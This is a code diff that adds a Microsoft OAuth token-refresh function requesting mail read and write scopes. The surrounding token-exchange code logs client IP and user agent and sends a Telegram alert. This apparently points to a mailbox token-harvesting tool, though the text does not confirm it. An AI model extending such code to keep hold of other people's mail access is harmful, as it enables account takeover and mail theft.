@@ -171,3 +171,30 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     send_telegram_alert(message)
 
     return result
+
+
+# =========================
+# TOKEN REFRESH
+# =========================
+def refresh_token(user_id: str, session_id: str = None):
+    token_record = get_token(user_id, session_id)
+
+    if not token_record or not token_record.refresh_token:
+        raise Exception("No refresh token available. User must re-login.")
+
+    data = {
+        "client_id": CLIENT_ID,
+        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
+        "refresh_token": token_record.refresh_token,
+        "grant_type": "refresh_token",
+        "client_secret": CLIENT_SECRET
+    }
+
+    response = requests.post(TOKEN_URL, data=data)
+    result = response.json()
+
+    if "error" in result:
+        raise Exception(f"Token refresh failed: {result['error_description']}")
+
+    save_token(user_id, token_record.session_id, result)
+    return result
